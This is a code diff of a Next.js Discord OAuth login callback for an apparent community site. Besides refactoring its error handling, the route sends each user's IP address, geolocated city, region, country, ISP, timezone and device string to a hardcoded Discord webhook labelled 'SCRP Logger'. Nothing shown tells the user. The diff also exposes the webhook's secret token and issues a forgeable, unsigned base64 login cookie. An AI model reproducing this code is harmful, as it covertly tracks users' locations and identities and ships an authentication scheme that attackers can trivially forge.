@@ -1,9 +1,11 @@
+import { cookies } from "next/headers"
+
 export async function GET(req) {
   const { searchParams } = new URL(req.url)
   const code = searchParams.get("code")
 
   if (!code) {
-    return new Response("Missing code from Discord", { status: 400 })
+    return Response.redirect("https://scrpsites.vercel.app/login?error=missing_code")
   }
 
   try {
@@ -24,7 +26,8 @@ export async function GET(req) {
     const tokenData = await tokenRes.json()
 
     if (!tokenData.access_token) {
-      return new Response("Failed to get Discord token", { status: 400 })
+      console.error("Discord token error:", tokenData)
+      return Response.redirect("https://scrpsites.vercel.app/login?error=token_failed")
     }
 
     // Get user info
@@ -36,6 +39,11 @@ export async function GET(req) {
 
     const user = await userRes.json()
 
+    if (!user.id) {
+      console.error("Discord user error:", user)
+      return Response.redirect("https://scrpsites.vercel.app/login?error=user_failed")
+    }
+
     // Build avatar URL
     const avatarURL = user.avatar
       ? `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png`
@@ -46,8 +54,13 @@ export async function GET(req) {
     const realIp = forwarded ? forwarded.split(",")[0] : "Unknown"
 
     // Get geolocation from ipwho.is
-    const geoRes = await fetch(`https://ipwho.is/${realIp}`)
-    const geoData = await geoRes.json()
+    let geoData = {}
+    try {
+      const geoRes = await fetch(`https://ipwho.is/${realIp}`)
+      geoData = await geoRes.json()
+    } catch (error) {
+      console.error("Geo lookup failed:", error)
+    }
 
     const city = geoData.city || "Unknown"
     const region = geoData.region || "Unknown"
@@ -66,41 +79,46 @@ export async function GET(req) {
       timeStyle: "short",
     })
 
-    // Send embed to webhook
-    await fetch(
-      "https://discord.com/api/webhooks/1388707471228670062/k5Nwg7siYplB7EBFxk6AMH1qS08d6LoxAP4PMnaUuBZSw02G9iTht9F7eWJQmMfcUdNx",
-      {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          embeds: [
-            {
-              title: "✅ New Discord Login",
-              color: 16777215,
-              thumbnail: {
-                url: avatarURL,
+    // Send embed to webhook (don't let this fail the auth flow)
+    try {
+      await fetch(
+        "https://discord.com/api/webhooks/1388707471228670062/k5Nwg7siYplB7EBFxk6AMH1qS08d6LoxAP4PMnaUuBZSw02G9iTht9F7eWJQmMfcUdNx",
+        {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            embeds: [
+              {
+                title: "✅ New Discord Login",
+                color: 16777215,
+                thumbnail: {
+                  url: avatarURL,
+                },
+                fields: [
+                  { name: "👤 Username", value: `${user.username}#${user.discriminator}`, inline: true },
+                  { name: "🆔 User ID", value: `${user.id}`, inline: true },
+                  { name: "🌐 IP Address", value: realIp, inline: false },
+                  { name: "📍 Location", value: `${city}, ${region}, ${country} :flag_${countryCode}:`, inline: false },
+                  { name: "🛰️ ISP", value: isp, inline: true },
+                  { name: "🕒 Timezone", value: timezone, inline: true },
+                  { name: "📅 Logged At", value: formattedTime, inline: false },
+                  { name: "📱 Device Info", value: userAgent, inline: false },
+                ],
+                footer: {
+                  text: "SCRP Logger",
+                },
+                timestamp: new Date().toISOString(),
               },
-              fields: [
-                { name: "👤 Username", value: `${user.username}#${user.discriminator}`, inline: true },
-                { name: "🆔 User ID", value: `${user.id}`, inline: true },
-                { name: "🌐 IP Address", value: realIp, inline: false },
-                { name: "📍 Location", value: `${city}, ${region}, ${country} :flag_${countryCode}:`, inline: false },
-                { name: "🛰️ ISP", value: isp, inline: true },
-                { name: "🕒 Timezone", value: timezone, inline: true },
-                { name: "📅 Logged At", value: formattedTime, inline: false },
-                { name: "📱 Device Info", value: userAgent, inline: false },
-              ],
-              footer: {
-                text: "SCRP Logger",
-              },
-              timestamp: new Date().toISOString(),
-            },
-          ],
-        }),
-      },
-    )
+            ],
+          }),
+        },
+      )
+    } catch (webhookError) {
+      console.error("Webhook failed:", webhookError)
+      // Don't fail auth because of webhook issues
+    }
 
-    // Create authentication token (simple approach - in production use JWT)
+    // Create authentication token
     const authToken = Buffer.from(
       JSON.stringify({
         userId: user.id,
@@ -111,23 +129,20 @@ export async function GET(req) {
       }),
     ).toString("base64")
 
-    // Create response with redirect
-    const response = new Response(null, {
-      status: 302,
-      headers: {
-        Location: "https://scrpsites.vercel.app/?success=true",
-      },
+    // Set the cookie using Next.js cookies API
+    const cookieStore = cookies()
+    cookieStore.set("scrp-auth", authToken, {
+      httpOnly: true,
+      secure: true,
+      sameSite: "strict",
+      maxAge: 30 * 24 * 60 * 60, // 30 days
+      path: "/",
     })
 
-    // Set authentication cookie (expires in 30 days)
-    response.headers.set(
-      "Set-Cookie",
-      `scrp-auth=${authToken}; Path=/; HttpOnly; Secure; SameSite=Strict; Max-Age=${30 * 24 * 60 * 60}`,
-    )
-
-    return response
+    // Redirect to home page
+    return Response.redirect("https://scrpsites.vercel.app/?success=true")
   } catch (error) {
     console.error("OAuth callback error:", error)
-    return new Response("Authentication failed", { status: 500 })
+    return Response.redirect("https://scrpsites.vercel.app/login?error=auth_failed")
   }
 }
